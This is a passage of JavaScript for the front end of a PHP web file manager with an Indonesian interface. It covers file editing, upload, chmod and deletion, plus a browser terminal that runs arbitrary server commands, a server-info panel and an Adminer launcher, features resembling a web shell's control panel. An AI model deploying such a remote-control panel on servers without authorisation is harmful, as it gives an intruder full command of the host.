    selected: new Set(),
    sort: { key: 'name', dir: 1 },
    filter: '',
    clipboard: null, // {mode:'copy'|'cut', paths:[]}
    loading: false,
    sep: '\\',
  };

  const $ = (s, el = document) => el.querySelector(s);
  const $$ = (s, el = document) => [...el.querySelectorAll(s)];

  /* ---------- icons (inline svg strings used in JS) ---------- */
  const I = {
    folder: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg>`,
    file: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6"/></svg>`,
    edit: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>`,
    trash: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M19 6l-1 14H6L5 6"/></svg>`,
    download: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12"/><path d="M7 10l5 5 5-5"/><path d="M5 21h14"/></svg>`,
    info: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v4h1"/></svg>`,
    chevron: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>`,
  };

  /* ---------- API ---------- */
  async function api(action, data = {}, files = null) {
    setLoading(true);
    try {
      const fd = new FormData();
      fd.append('action', action);
      Object.keys(data || {}).forEach(function (k) {
        var v = data[k];
        if (Array.isArray(v)) {
          v.forEach(function (x) { fd.append(k + '[]', x); });
        } else if (v !== undefined && v !== null) {
          fd.append(k, v);
        }
      });
      if (files) {
        Array.prototype.forEach.call(files, function (f) { fd.append('files[]', f); });
      }
      var url = API;
      // ensure api flag always present
      if (url.indexOf('api=') < 0) {
        url += (url.indexOf('?') >= 0 ? '&' : '?') + 'api=1';
      }
      const res = await fetch(url, {
        method: 'POST',
        body: fd,
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
        credentials: 'same-origin',
        cache: 'no-store',
      });
      const raw = await res.text();
      var text = (raw || '').replace(/^\uFEFF/, '').trim();
      if (!text) {
        throw new Error('Server mengembalikan respons kosong (HTTP ' + res.status + '). Cek error PHP / disable_functions.');
      }
      var json;
      try {
        json = JSON.parse(text);
      } catch (parseErr) {
        // often HTML error page or truncated body
        var preview = text.replace(/\s+/g, ' ').slice(0, 180);
        throw new Error('Respons bukan JSON (HTTP ' + res.status + '): ' + preview);
      }
      if (!json || typeof json !== 'object') {
        throw new Error('Respons JSON tidak valid');
      }
      if (json.ok === false && json.error) throw new Error(json.error);
      if (!res.ok && json.error) throw new Error(json.error);
      return json;
    } finally {
      setLoading(false);
    }
  }

  function setLoading(on) {
    state.loading = on;
    const bar = $('#loadingBar');
    if (on) { bar.classList.add('on'); bar.classList.remove('done'); }
    else { bar.classList.add('done'); setTimeout(() => bar.classList.remove('on', 'done'), 400); }
  }

  function toast(msg, type = 'ok') {
    const el = document.createElement('div');
    el.className = 'toast ' + type;
    el.innerHTML = `<span>${esc(msg)}</span><button class="t-close" aria-label="Tutup">✕</button>`;
    el.querySelector('button').onclick = () => el.remove();
    $('#toasts').appendChild(el);
    setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 4200);
  }

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }

  function setStatus(text) {
    $('#statusText').textContent = text;
  }

  /* ---------- list ---------- */
  async function load(path = state.path) {
    try {
      const data = await api('list', { path });
      state.path = data.path || '';
      try { sessionStorage.setItem(PATH_KEY, state.path); } catch (_) {}
      state.items = data.items || [];
      state.selected.clear();
      renderPwd(data.crumbs || [], data.full || '', data.sep || '\\');
      renderTable();
      updateSelBar();
      $('#statusCount').textContent = data.count + ' item';
      setStatus('Siap');
    } catch (e) {
      // path invalid → kembali ke folder file manager
      if (path !== FM_HOME) {
        try { sessionStorage.removeItem(PATH_KEY); } catch (_) {}
        state.path = FM_HOME;
        return load(FM_HOME);
      }
      toast(e.message, 'err');
      setStatus('Error: ' + e.message);
    }
  }

  function filteredSorted() {
    let list = state.items.slice();
    const q = state.filter.trim().toLowerCase();
    if (q) list = list.filter(i => i.name.toLowerCase().includes(q));
    const { key, dir } = state.sort;
    list.sort((a, b) => {
      if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
      let av = a[key], bv = b[key];
      if (key === 'name') return dir * String(av).localeCompare(String(bv), undefined, { sensitivity: 'base' });
      if (typeof av === 'string') return dir * av.localeCompare(bv);
      return dir * ((av || 0) - (bv || 0));
    });
    return list;
  }

  /**
   * PWD klikable per folder:
   * C:\ › xampp › htdocs › abadinanjaya
   * Klik "htdocs" → pindah ke C:\xampp\htdocs
   */

  function renderPwd(crumbs, full, sep) {
    var el = document.getElementById('pwdPath');
    if (!el) return;
    crumbs = crumbs || [];
    var s = sep || state.sep || '\\';
    state.sep = s;
    el.setAttribute('data-full', full || '');
    el.title = full || 'Klik nama folder untuk pindah';
    var parts = [];
    for (var i = 0; i < crumbs.length; i++) {
      var cr = crumbs[i] || {};
      var last = (i === crumbs.length - 1);
      var name = String(cr.name == null ? '' : cr.name);
      var path = String(cr.path == null ? '' : cr.path);
      parts.push('<button type="button" class="pwd-seg' + (last ? ' current' : '') + '" data-path="' + esc(path) + '" title="' + esc(name) + '">' + esc(name) + '</button>');
      if (!last) {
        var rootish = (i === 0 && (name === '/' || /[\\\/]$/.test(name)));
        if (!rootish) parts.push('<span class="pwd-sep">' + esc(s) + '</span>');
      }
    }
    el.innerHTML = parts.join('');
    var segs = el.querySelectorAll('.pwd-seg');
    Array.prototype.forEach.call(segs, function (b) {
      b.onclick = function () {
        if (b.classList.contains('current') && (b.getAttribute('data-path') || '') === state.path) return;
        load(b.getAttribute('data-path') || '');
      };
    });
  }

  function renderTable() {
    const list = filteredSorted();
    const tb = $('#tbody');
    const empty = $('#empty');
    // tampil empty state hanya jika list benar-benar kosong
    const isEmpty = !list || list.length === 0;
    if (empty) {
      if (isEmpty) {
        empty.removeAttribute('hidden');
        empty.hidden = false;
        const msg = empty.querySelector('.empty-msg') || empty.querySelector('div');
        if (msg) {
          msg.textContent = state.filter
            ? ('Tidak ada hasil untuk “' + state.filter + '”')
            : 'Folder kosong';
        }
        const addBtn = empty.querySelector('#btnEmptyAdd');
        if (addBtn) addBtn.style.display = state.filter ? 'none' : '';
      } else {
        empty.setAttribute('hidden', '');
        empty.hidden = true;
      }
    }
    if (isEmpty) {
      tb.innerHTML = '';
      return;
    }
    tb.innerHTML = list.map(item => {
      const sel = state.selected.has(item.path);
      const ico = item.type === 'dir' ? I.folder : I.file;
      return `<tr data-path="${esc(item.path)}" data-type="${item.type}" class="${sel ? 'selected' : ''}">
        <td class="col-check"><input type="checkbox" class="chk row-chk" ${sel ? 'checked' : ''} data-path="${esc(item.path)}"></td>
        <td class="col-name">
          <div class="name-cell">
            <span class="ico ${item.type}">${ico}</span>
            <span class="label" title="${esc(item.name)}">${esc(item.name)}</span>
          </div>
        </td>
        <td class="col-size mono">${esc(item.size_h)}</td>
        <td class="col-mtime mono">${esc(item.mtime_h)}</td>
        <td class="col-perms mono" title="${esc(item.perms)}">${esc(item.chmod)} <span style="opacity:.5">${esc(item.perms)}</span></td>
        <td class="col-actions">
          <div class="row-acts">
            ${item.type === 'file' && item.editable ? `<button class="icon-btn act-edit" title="Edit">${I.edit}</button>` : ''}
            ${item.type === 'file' ? `<button class="icon-btn act-dl" title="Download">${I.download}</button>` : ''}
            <button class="icon-btn act-rename" title="Rename">${I.edit}</button>
            <button class="icon-btn act-info" title="Info">${I.info}</button>
            <button class="icon-btn danger act-del" title="Hapus">${I.trash}</button>
          </div>
        </td>
      </tr>`;
    }).join('');

    $$('#tbody tr').forEach(tr => {
      const path = tr.dataset.path;
      const item = state.items.find(i => i.path === path);
      tr.addEventListener('dblclick', () => {
        if (item.type === 'dir') load(item.path);
        else if (item.editable) openEditor(item.path);
        else download(item.path);
      });
      tr.querySelector('.label').onclick = (e) => {
        e.stopPropagation();
        if (item.type === 'dir') load(item.path);
        else if (item.editable) openEditor(item.path);
      };
      tr.querySelector('.row-chk').onchange = (e) => {
        e.stopPropagation();
        toggleSel(path, e.target.checked);
      };
      tr.addEventListener('click', (e) => {
        if (e.target.closest('button, input, .label')) return;
        const on = !state.selected.has(path);
        if (!e.ctrlKey && !e.metaKey) state.selected.clear();
        toggleSel(path, on);
        renderTable();
      });
      tr.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        if (!state.selected.has(path)) {
          state.selected.clear();
          state.selected.add(path);
          renderTable();
          updateSelBar();
        }
        showCtx(e.clientX, e.clientY, item);
      });
      const edit = tr.querySelector('.act-edit');
      if (edit) edit.onclick = (e) => { e.stopPropagation(); openEditor(path); };
      const dl = tr.querySelector('.act-dl');
      if (dl) dl.onclick = (e) => { e.stopPropagation(); download(path); };
      tr.querySelector('.act-rename').onclick = (e) => { e.stopPropagation(); openRename(path); };
      tr.querySelector('.act-info').onclick = (e) => { e.stopPropagation(); openInfo(path); };
      tr.querySelector('.act-del').onclick = (e) => { e.stopPropagation(); doDelete([path]); };
    });
    $('#checkAll').checked = list.length > 0 && list.every(i => state.selected.has(i.path));
  }

  function toggleSel(path, on) {
    if (on) state.selected.add(path); else state.selected.delete(path);
    updateSelBar();
  }

  function updateSelBar() {
    const n = state.selected.size;
    const bar = $('#selBar');
    bar.classList.toggle('show', n > 0);
    $('#selCount').textContent = n + ' dipilih';
    $('#btnRenameOne').style.display = n === 1 ? '' : 'none';
  }

  /* ---------- modal ---------- */
  let modalOnConfirm = null;

  function openModal({ title, body, confirmText = 'OK', cancelText = 'Batal', onConfirm, wide = false, hideCancel = false }) {
    const bg = $('#modalBg');
    const modal = $('#modal');
    modal.classList.remove('term-mode');
    modal.classList.toggle('wide', !!wide);
    $('#modalTitle').textContent = title;
    $('#modalBody').innerHTML = body;
    const foot = $('#modalFoot');
    foot.innerHTML = '';
    foot.style.display = '';
    if (!hideCancel) {
      const c = document.createElement('button');
      c.className = 'btn btn-ghost';
      c.textContent = cancelText;
      c.onclick = closeModal;
      foot.appendChild(c);
    }
    if (confirmText) {
      const ok = document.createElement('button');
      ok.className = 'btn btn-primary';
      ok.id = 'modalOk';
      ok.textContent = confirmText;
      ok.onclick = async () => {
        if (onConfirm) {
          ok.disabled = true;
          try { await onConfirm(); } catch (e) { toast(e.message, 'err'); ok.disabled = false; return; }
        }
        closeModal();
      };
      foot.appendChild(ok);
    }
    modalOnConfirm = onConfirm;
    bg.classList.add('show');
    const first = $('#modalBody input, #modalBody textarea');
    if (first) setTimeout(() => first.focus(), 50);
  }

  function closeModal() {
    $('#modalBg').classList.remove('show');
    $('#modal').classList.remove('wide', 'term-mode');
    $('#modalFoot').style.display = '';
    modalOnConfirm = null;
  }

  $('#modalClose').onclick = closeModal;
  $('#modalBg').addEventListener('click', (e) => { if (e.target === $('#modalBg')) closeModal(); });

  /* ---------- actions ---------- */
  function openAddFile() {
    openModal({
      title: 'Tambah File',
      body: `<div class="field"><label>Nama file</label><input id="mName" placeholder="contoh: index.html" value="untitled.txt"></div>
             <div class="field"><label>Isi awal (opsional)</label><textarea id="mContent" rows="6" placeholder=""></textarea></div>`,
      confirmText: 'Buat',
      onConfirm: async () => {
        const name = $('#mName').value.trim();
        if (!name) throw new Error('Nama wajib diisi');
        await api('mkfile', { path: state.path, name, content: $('#mContent').value });
        toast('File dibuat');
        await load();
      }
    });
  }

  function openAddFolder() {
    openModal({
      title: 'Tambah Folder',
      body: `<div class="field"><label>Nama folder</label><input id="mName" placeholder="folder-baru"></div>`,
      confirmText: 'Buat',
      onConfirm: async () => {
        const name = $('#mName').value.trim();
        if (!name) throw new Error('Nama wajib diisi');
        await api('mkdir', { path: state.path, name });
        toast('Folder dibuat');
        await load();
      }
    });
  }

  function openRename(path) {
    const item = state.items.find(i => i.path === path) || { name: path.split('/').pop(), type: 'file' };
    openModal({
      title: 'Rename ' + (item.type === 'dir' ? 'Folder' : 'File'),
      body: `<div class="field"><label>Nama baru</label><input id="mName" value="${esc(item.name)}"></div>
             <p class="hint" style="color:var(--muted2);font-size:12px">Path: ${esc(path)}</p>`,
      confirmText: 'Rename',
      onConfirm: async () => {
        const name = $('#mName').value.trim();
        if (!name) throw new Error('Nama wajib');
        await api('rename', { path, name });
        toast('Berhasil di-rename');
        await load();
      }
    });
  }

  async function openEditor(path) {
    let data;
    try { data = await api('read', { path }); }
    catch (e) { toast(e.message, 'err'); return; }
    openModal({
      title: 'Edit — ' + data.name,
      wide: true,
      body: `<div class="editor-bar">
          <span>${esc(data.path)}</span>
          <span>·</span>
          <span id="edSize">${fmtSize(data.size)}</span>
          <span>·</span>
          <span>chmod ${esc(data.chmod)}</span>
          <span style="margin-left:auto;color:${data.writable ? 'var(--success)' : 'var(--danger)'}">${data.writable ? 'Writable' : 'Read-only'}</span>
        </div>
        <textarea class="editor" id="editor" spellcheck="false"${data.writable ? '' : ' readonly'}>${esc(data.content)}</textarea>`,
      confirmText: data.writable ? 'Simpan' : '',
      cancelText: 'Tutup',
      onConfirm: data.writable ? async () => {
        const content = $('#editor').value;
        const r = await api('write', { path, content });
        toast('Tersimpan (' + fmtSize(r.size) + ')');
        await load();
      } : null
    });
    // tab support in editor
    const ed = $('#editor');
    if (ed) {
      ed.addEventListener('keydown', (e) => {
        if (e.key === 'Tab') {
          e.preventDefault();
          const s = ed.selectionStart, end = ed.selectionEnd;
          ed.value = ed.value.slice(0, s) + '    ' + ed.value.slice(end);
          ed.selectionStart = ed.selectionEnd = s + 4;
        }
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
          e.preventDefault();
          $('#modalOk')?.click();
        }
      });
    }
  }

  function openChmod(paths) {
    const first = state.items.find(i => i.path === paths[0]);
    const mode = first ? first.chmod : '755';
    openModal({
      title: 'CHMOD — ' + paths.length + ' item',
      body: `
        <div class="field"><label>Mode (octal)</label>
          <input id="mMode" value="${esc(mode)}" maxlength="4" style="font-family:var(--mono);font-size:18px;letter-spacing:.1em">
          <div class="hint">Contoh: 644 (file), 755 (folder), 777 (full — hati-hati)</div>
        </div>
        <div class="presets">
          ${['644','664','600','755','775','700','777'].map(p => `<button type="button" class="preset" data-p="${p}">${p}</button>`).join('')}
        </div>
        <div class="chmod-grid" id="chmodGrid"></div>
        <div class="field" style="margin-top:14px">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="checkbox" id="mRec" class="chk"> Terapkan rekursif (folder & isinya)
          </label>
        </div>`,
      confirmText: 'Terapkan',
      onConfirm: async () => {
        const m = $('#mMode').value.trim();
        if (!/^[0-7]{3,4}$/.test(m)) throw new Error('Mode tidak valid');
        const r = await api('chmod', { paths, mode: m, recursive: $('#mRec').checked ? '1' : '' });
        toast(r.message || 'CHMOD OK');
        if (r.errors?.length) toast(r.errors.join(', '), 'err');
        await load();
      }
    });
    const syncChecks = () => {
      const m = $('#mMode').value.trim();
      if (!/^[0-7]{3}$/.test(m) && !/^[0-7]{4}$/.test(m)) return;
      const oct = m.slice(-3);
      const roles = ['Owner', 'Group', 'Public'];
      const bits = ['r', 'w', 'x'];
      let html = '';
      for (let i = 0; i < 3; i++) {
        const n = parseInt(oct[i], 8);
        html += `<div class="chmod-box"><h4>${roles[i]}</h4>`;
        bits.forEach((b, bi) => {
          const on = (n & (4 >> bi)) !== 0;
          html += `<label><input type="checkbox" class="chk chbit" data-role="${i}" data-bit="${4 >> bi}" ${on ? 'checked' : ''}> ${b === 'r' ? 'Read' : b === 'w' ? 'Write' : 'Execute'} (${b})</label>`;
        });
        html += `</div>`;
      }
      $('#chmodGrid').innerHTML = html;
      $$('.chbit').forEach(c => c.onchange = () => {
        let out = '';
        for (let i = 0; i < 3; i++) {
          let v = 0;
          $$(`.chbit[data-role="${i}"]`).forEach(x => { if (x.checked) v += parseInt(x.dataset.bit, 10); });
          out += String(v);
        }
        $('#mMode').value = out;
      });
    };
    $('#mMode').addEventListener('input', syncChecks);
    $$('.preset').forEach(b => b.onclick = () => { $('#mMode').value = b.dataset.p; syncChecks(); });
    syncChecks();
  }

  async function openMove(paths, mode = 'move') {
    // pick destination folder
    let tree;
    try { tree = await api('tree', { path: '' }); }
    catch (e) { toast(e.message, 'err'); return; }

    function walk(nodes, prefix = '') {
      let html = '';
      nodes.forEach(n => {
        html += `<div class="fp-item" data-path="${esc(n.path)}">${I.folder}<span>${esc(prefix + n.name)}</span></div>`;
        if (n.children?.length) html += walk(n.children, prefix + n.name + '/');
      });
      return html;
    }

    openModal({
      title: (mode === 'move' ? 'Pindah' : 'Copy') + ' ke folder…',
      body: `<div class="field"><label>Pilih tujuan</label>
        <div class="folder-picker" id="fp">
          <div class="fp-item picked" data-path="">${I.folder}<span>Root</span></div>
          ${walk(tree.tree || [])}
        </div>
        <div class="hint" style="margin-top:8px">Tujuan: <strong id="fpSel">Root</strong></div>
      </div>`,
      confirmText: mode === 'move' ? 'Pindah' : 'Copy',
      onConfirm: async () => {
        const _picked = $('#fp .fp-item.picked'); const dest = _picked && _picked.dataset ? (_picked.dataset.path || '') : '';
        const r = await api(mode, { paths, dest });
        toast(r.message || 'OK');
        if (r.errors?.length) toast(r.errors.join(', '), 'err');
        state.selected.clear();
        await load();
      }
    });
    $$('#fp .fp-item').forEach(it => {
      it.onclick = () => {
        $$('#fp .fp-item').forEach(x => x.classList.remove('picked'));
        it.classList.add('picked');
        $('#fpSel').textContent = it.dataset.path || 'Root';
      };
    });
  }

  async function openInfo(path) {
    let d;
    try { d = await api('info', { path }); }
    catch (e) { toast(e.message, 'err'); return; }
    openModal({
      title: 'Info — ' + d.name,
      body: `<table style="width:100%;font-size:13px;border-collapse:collapse">
        ${row('Nama', d.name)}${row('Path', d.path || '/')}
        ${row('Tipe', d.type)}${row('Ukuran', d.size_h)}
        ${row('Permission', d.perms + ' (' + d.chmod + ')')}
        ${row('Readable', d.readable ? 'Ya' : 'Tidak')}
        ${row('Writable', d.writable ? 'Ya' : 'Tidak')}
        ${row('Modified', d.mtime)}${row('Created', d.ctime)}
        ${row('Owner', d.owner)}
        ${row('Full path', d.full)}
      </table>`,
      confirmText: '',
      cancelText: 'Tutup'
    });
    function row(k, v) {
      return `<tr style="border-bottom:1px solid var(--border)"><td style="padding:8px 0;color:var(--muted);width:120px">${esc(k)}</td><td style="padding:8px 0;word-break:break-all;font-family:var(--mono);font-size:12px">${esc(v)}</td></tr>`;
    }
  }

  async function doDelete(paths) {
    if (!paths.length) return;
    openModal({
      title: 'Hapus ' + paths.length + ' item?',
      body: `<p style="color:var(--muted);margin-bottom:10px">Tindakan ini tidak bisa dibatalkan.</p>
        <ul style="max-height:180px;overflow:auto;padding-left:18px;color:#fca5a5;font-size:13px">
          ${paths.map(p => `<li>${esc(p)}</li>`).join('')}
        </ul>`,
      confirmText: 'Hapus',
      onConfirm: async () => {
        const r = await api('delete', { paths });
        toast(r.message || 'Dihapus');
        if (r.errors?.length) toast(r.errors.join(', '), 'err');
        state.selected.clear();
        await load();
      }
    });
    // make confirm red
    setTimeout(() => {
      const ok = $('#modalOk');
      if (ok) { ok.className = 'btn btn-danger'; ok.textContent = 'Hapus permanen'; }
    }, 0);
  }

  function download(path) {
    const a = document.createElement('a');
    a.href = API + '&action=download&path=' + encodeURIComponent(path);
    a.download = '';
    document.body.appendChild(a);
    a.click();
    a.remove();
  }

  function fmtSize(n) {
    n = +n || 0;
    const u = ['B','KB','MB','GB'];
    let i = 0;
    while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
    return (i ? n.toFixed(2) : n) + ' ' + u[i];
  }

  /* ---------- context menu ---------- */
  function showCtx(x, y, item) {
    const menu = $('#ctx');
    const paths = state.selected.size ? [...state.selected] : [item.path];
    const multi = paths.length > 1;
    menu.innerHTML = `
      ${!multi && item.type === 'dir' ? `<button data-a="open">${I.folder} Buka</button>` : ''}
      ${!multi && item.type === 'file' && item.editable ? `<button data-a="edit">${I.edit} Edit</button>` : ''}
      ${!multi && item.type === 'file' ? `<button data-a="dl">${I.download} Download</button>` : ''}
      <button data-a="rename" ${multi ? 'disabled style="opacity:.4"' : ''}>${I.edit} Rename</button>
      <button data-a="move">↕ Pindah</button>
      <button data-a="copy">⧉ Copy</button>
      <button data-a="chmod">🔐 CHMOD</button>
      <button data-a="info" ${multi ? 'disabled style="opacity:.4"' : ''}>${I.info} Info</button>
      <hr>
      <button class="danger" data-a="del">${I.trash} Hapus</button>
    `;
    menu.classList.add('show');
    const pad = 8;
    const w = menu.offsetWidth, h = menu.offsetHeight;
    menu.style.left = Math.min(x, innerWidth - w - pad) + 'px';
    menu.style.top = Math.min(y, innerHeight - h - pad) + 'px';
    menu.onclick = (e) => {
      const b = e.target.closest('button');
      if (!b || b.disabled) return;
      hideCtx();
      const a = b.dataset.a;
      if (a === 'open') load(item.path);
      if (a === 'edit') openEditor(item.path);
      if (a === 'dl') download(item.path);
      if (a === 'rename') openRename(item.path);
      if (a === 'move') openMove(paths, 'move');
      if (a === 'copy') openMove(paths, 'copy');
      if (a === 'chmod') openChmod(paths);
      if (a === 'info') openInfo(item.path);
      if (a === 'del') doDelete(paths);
    };
  }
  function hideCtx() { $('#ctx').classList.remove('show'); }
  document.addEventListener('click', hideCtx);
  document.addEventListener('scroll', hideCtx, true);

  /* ---------- upload / drag ---------- */
  $('#btnUpload').onclick = () => $('#fileInput').click();
  $('#fileInput').onchange = async () => {
    const files = $('#fileInput').files;
    if (!files?.length) return;
    try {
      const r = await api('upload', { path: state.path }, files);
      toast(r.message || 'Upload OK');
      if (r.errors?.length) toast(r.errors.join(', '), 'err');
      await load();
    } catch (e) { toast(e.message, 'err'); }
    $('#fileInput').value = '';
  };

  const wrap = $('#tableWrap');
  let dragCounter = 0;
  ['dragenter', 'dragover'].forEach(ev => {
    wrap.addEventListener(ev, (e) => {
      e.preventDefault();
      dragCounter++;
      wrap.classList.add('dragging');
    });
  });
  wrap.addEventListener('dragleave', () => {
    dragCounter--;
    if (dragCounter <= 0) { dragCounter = 0; wrap.classList.remove('dragging'); }
  });
  wrap.addEventListener('drop', async (e) => {
    e.preventDefault();
    dragCounter = 0;
    wrap.classList.remove('dragging');
    const files = e.dataTransfer?.files;
    if (!files?.length) return;
    try {
      const r = await api('upload', { path: state.path }, files);
      toast(r.message || 'Upload OK');
      await load();
    } catch (err) { toast(err.message, 'err'); }
  });

  /* ---------- tools ---------- */
  function openTerminal() {
    var cwdFull = ($('#pwdPath').dataset.full || state.path || 'root');
    var isWin = String(cwdFull).indexOf(':\\') >= 0 || /^[A-Za-z]:$/.test(String(cwdFull));
    var ph = isWin ? 'dir  |  echo hello  |  php -v' : 'ls -la  |  echo hello  |  php -v';
    openModal({
      title: 'Terminal',
      wide: true,
      body: ''
        + '<div class="term-shell">'
        +   '<div class="term-bar">'
        +     '<span class="term-bar-badge">Shell</span>'
        +     '<div class="term-bar-path" id="termCwd" title="' + esc(cwdFull) + '">' + esc(cwdFull) + '</div>'
        +     '<span class="term-bar-hint">↑↓ history · Enter run</span>'
        +   '</div>'
        +   '<div class="term-screen">'
        +     '<textarea class="term-out" id="termOut" readonly spellcheck="false" placeholder="Output command muncul di sini…"></textarea>'
        +   '</div>'
        +   '<form class="term-cmd" id="termForm">'
        +     '<span class="term-prompt">$</span>'
        +     '<input class="term-in" id="termIn" placeholder="' + esc(ph) + '" autocomplete="off" spellcheck="false">'
        +     '<button type="submit" class="btn btn-primary">Run</button>'
        +   '</form>'
        + '</div>',
      confirmText: '',
      cancelText: 'Tutup'
    });
    var modal = $('#modal');
    if (modal) modal.classList.add('term-mode');
    var out = $('#termOut'), inp = $('#termIn'), hist = [], histIdx = -1, busy = false;
    out.value = 'ABADINANJAYA Terminal\n' + cwdFull + '\n' + '────────────────────────────────\n';
    function appendLine(s, kind) {
      out.value += s + (s && s.slice(-1) !== '\n' ? '\n' : '');
      out.scrollTop = out.scrollHeight;
    }
    function run(cmd) {
      if (!String(cmd).trim() || busy) return Promise.resolve();
      busy = true;
      inp.disabled = true;
      appendLine('$ ' + cmd);
      return api('term', { cmd: cmd, cwd: state.path }).then(function(r) {
        var text = r.output == null ? '' : String(r.output);
        if (text) appendLine(text.replace(/\r\n/g, '\n').replace(/\r/g, '\n'));
        if (r.code) appendLine('[exit ' + r.code + ']');
      }).catch(function(e) {
        appendLine('Error: ' + e.message);
      }).then(function() {
        busy = false;
        inp.disabled = false;
        inp.focus();
      });
    }
    $('#termForm').onsubmit = function(e) {
      e.preventDefault();
      var cmd = inp.value;
      if (!String(cmd).trim()) return;
      hist.push(cmd); histIdx = hist.length;
      inp.value = '';
      run(cmd);
    };
    inp.onkeydown = function(e) {
      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx > 0) { histIdx--; inp.value = hist[histIdx] || ''; inp.setSelectionRange(inp.value.length, inp.value.length); }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (histIdx < hist.length - 1) { histIdx++; inp.value = hist[histIdx] || ''; }
        else { histIdx = hist.length; inp.value = ''; }
      } else if (e.key === 'l' && (e.ctrlKey || e.metaKey)) {
        e.preventDefault();
        out.value = '';
      }
    };
    setTimeout(function(){ inp.focus(); }, 80);
  }

  function openCodec() {
    var modes = [
      ['b64_enc','Base64 Encode'],['b64_dec','Base64 Decode'],
      ['url_enc','URL Encode'],['url_dec','URL Decode'],
      ['html_enc','HTML Encode'],['html_dec','HTML Decode'],
      ['hex_enc','Hex Encode'],['hex_dec','Hex Decode'],
      ['md5','MD5'],['sha1','SHA1'],['sha256','SHA256'],
      ['json_pretty','JSON Pretty'],['json_minify','JSON Minify'],
      ['rot13','ROT13'],['upper','UPPER'],['lower','lower'],['len','Length']
    ];
    openModal({
      title: 'Encode && Decode',
      wide: true,
      body: '<div style="padding:14px;display:flex;flex-direction:column;gap:10px;min-height:0;flex:1">'
        + '<div class="tool-panel-grid" style="flex:1;min-height:0">'
        + '<div style="display:flex;flex-direction:column;gap:6px;min-height:0"><label style="font-size:12px;color:var(--muted);font-weight:600">Input</label>'
        + '<textarea class="codec-out" id="codecIn" placeholder="Tempel teks…" style="color:var(--text);flex:1"></textarea></div>'
        + '<div style="display:flex;flex-direction:column;gap:6px;min-height:0"><label style="font-size:12px;color:var(--muted);font-weight:600">Output</label>'
        + '<textarea class="codec-out" id="codecOut" placeholder="Hasil…" style="flex:1"></textarea></div></div>'
        + '<div class="codec-actions" id="codecActs">' + modes.map(function(m){ return '<button type="button" data-mode="'+m[0]+'">'+m[1]+'</button>'; }).join('') + '</div>'
        + '<div style="display:flex;gap:8px"><button type="button" class="btn btn-ghost" id="codecSwap">Tukar In/Out</button>'
        + '<button type="button" class="btn btn-ghost" id="codecCopy">Salin Output</button>'
        + '<button type="button" class="btn btn-ghost" id="codecClear">Clear</button></div></div>',
      confirmText: '',
      cancelText: 'Tutup'
    });
    function runMode(mode) {
      api('codec', { mode: mode, text: $('#codecIn').value }).then(function(r) {
        $('#codecOut').value = r.result == null ? '' : String(r.result);
      }).catch(function(e){ toast(e.message, 'err'); });
    }
    $$('#codecActs button').forEach(function(b){ b.onclick = function(){ runMode(b.dataset.mode); }; });
    $('#codecSwap').onclick = function(){ var a=$('#codecIn').value,b=$('#codecOut').value; $('#codecIn').value=b; $('#codecOut').value=a; };
    $('#codecCopy').onclick = function(){ navigator.clipboard.writeText($('#codecOut').value).then(function(){ toast('Disalin'); }).catch(function(){ toast('Gagal salin','err'); }); };
    $('#codecClear').onclick = function(){ $('#codecIn').value=''; $('#codecOut').value=''; };
  }

  function openAdminer() {
    toast('Membuka Adminer…');
    // server auto-install + redirect
    var base = location.pathname;
    if (base.slice(-1) === '/') base += 'index.php';
    else if (!/index\.php$/i.test(base)) base = base.replace(/\/?$/, '/index.php');
    window.location.href = base + '?go=adminer';
  }


  function openSysinfo() {
    openModal({ title:'Server Info', wide:true, body:'<div style="padding:16px" id="sysBox"><div style="color:var(--muted)">Memuat…</div></div>', confirmText:'', cancelText:'Tutup' });
    api('sysinfo').then(function(r){
      var rows = [
        ['uname -a', r.uname || '-'],
        ['OS / Family', (r.distro || r.os || '-') + (r.family ? ' · ' + r.family : '')],
        ['Kernel', r.kernel || '-'],
        ['Arch', r.arch || '-'],
        ['Host', r.host || r.server_name || '-'],
        ['CPU', r.cpus || '-'],
        ['Load avg', r.load || '-'],
        ['Uptime', r.uptime || '-'],
        ['User', r.user || '-'],
        ['PHP', r.php + ' · ' + r.sapi],
        ['Server', r.server_soft],
        ['Document root', r.docroot],
        ['FM root', r.fm_root],
        ['FM home', r.fm_home],
        ['Time', r.time + ' (' + r.timezone + ')'],
        ['Disk free', r.disk_free + ' / ' + r.disk_total],
        ['memory_limit', r.memory_limit],
        ['upload_max', r.upload_max],
        ['post_max', r.post_max],
        ['max_exec', r.max_exec],
        ['PDO', (r.pdo_drivers||[]).join(', ') || '-'],
        ['Extensions', (r.extensions||[]).length + ' loaded'],
        ['Disabled', r.disabled || '-']
      ];
      $('#sysBox').innerHTML = '<div class="sys-grid">' + rows.map(function(x){ return '<div class="k">'+esc(x[0])+'</div><div class="v">'+esc(x[1])+'</div>'; }).join('') + '</div>'
